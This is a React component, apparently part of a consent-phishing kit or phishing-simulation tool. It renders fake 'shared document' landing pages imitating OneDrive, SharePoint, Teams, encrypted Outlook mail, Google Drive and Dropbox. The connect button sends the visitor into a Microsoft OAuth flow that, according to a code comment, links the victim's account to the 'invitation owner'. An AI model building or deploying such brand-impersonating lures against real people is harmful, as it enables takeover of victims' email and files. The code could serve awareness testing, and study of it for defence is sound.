"use client";

import { useState } from "react";
import OneDriveTemplate from "@/components/templates/OneDriveTemplate";
import SharePointTemplate from "@/components/templates/SharePointTemplate";
import TeamsTemplate from "@/components/templates/TeamsTemplate";
import OutlookTemplate from "@/components/templates/OutlookTemplate";
import GoogleDriveTemplate from "@/components/templates/GoogleDriveTemplate";
import DropboxTemplate from "@/components/templates/DropboxTemplate";

interface InvitationLandingProps {
  invitationId: string;
  invitationCode: string;
  template: string;
  documentTitle: string;
  docType: string;
  senderName: string;
  exitUrl: string | null;
}

export default function InvitationLanding({
  invitationCode,
  template,
  documentTitle,
  docType,
  senderName,
}: InvitationLandingProps) {
  const [connecting, setConnecting] = useState(false);

  const handleConnect = () => {
    setConnecting(true);
    // Redirect to web OAuth flow with invitation code
    // The callback will link the account to the invitation owner
    window.location.href = `/api/auth/microsoft/redirect?invitationCode=${encodeURIComponent(invitationCode)}`;
  };

  const templateProps = {
    documentTitle,
    docType,
    senderName,
    onConnect: handleConnect,
    connecting,
  };

  switch (template) {
    case "SHAREPOINT_DOCUMENT":
      return <SharePointTemplate {...templateProps} />;
    case "TEAMS_CHAT_FILE":
      return <TeamsTemplate {...templateProps} />;
    case "OUTLOOK_ENCRYPTED":
      return <OutlookTemplate {...templateProps} />;
    case "GOOGLE_DRIVE":
      return <GoogleDriveTemplate {...templateProps} />;
    case "DROPBOX_FILE":
      return <DropboxTemplate {...templateProps} />;
    default:
      return <OneDriveTemplate {...templateProps} />;
  }
}
